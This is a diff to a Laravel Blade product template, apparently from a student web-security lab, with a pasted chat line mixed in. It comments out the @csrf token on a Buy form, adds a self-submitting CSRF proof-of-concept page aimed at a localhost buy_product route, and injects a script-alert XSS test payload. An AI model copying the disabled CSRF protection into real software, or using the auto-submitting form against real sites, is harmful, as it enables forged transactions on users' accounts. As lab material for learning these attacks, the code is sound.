@@ -112,6 +112,29 @@
             </div>
         </div>
     </div>
+    [4/30/2025 2:36 AM] Abdullah: // ...existing code...
+                    <!-- Buy Button: Only if user has enough credit -->
+                    @if(auth()->check() && auth()->user()->credit >= $product->price && $product->quantity > 0)
+                    <form action="{{ route('buy_product', $product->id) }}" method="POST">
+                        {{-- @csrf --}}
+                        <button type="submit" class="btn btn-primary">Buy</button>
+                    </form>
+                    @elseif($product->quantity == 0)
+                        <button class="btn btn-secondary" disabled>Out of Stock</button>
+                    @elseif(auth()->check())
+                        <button class="btn btn-secondary" disabled>Not Enough Credit</button>
+                    @else
+                        <a href="{{ route('login') }}" class="btn btn-info">Login</a>
+                    @endif
+ <!-- csrf_attack.html -->
+<form action="http://localhost/WebSec230102723/WebSecService/public/buy_product/1" method="POST" id="csrfForm">
+  <!-- You can add hidden fields if your endpoint expects them -->
+</form>
+<script>
+  document.getElementById('csrfForm').submit();
+  alert('CSRF attack attempted!');
+</script>
+ <script>alert('XSS')</script>
 @endforeach
 
 @endsection
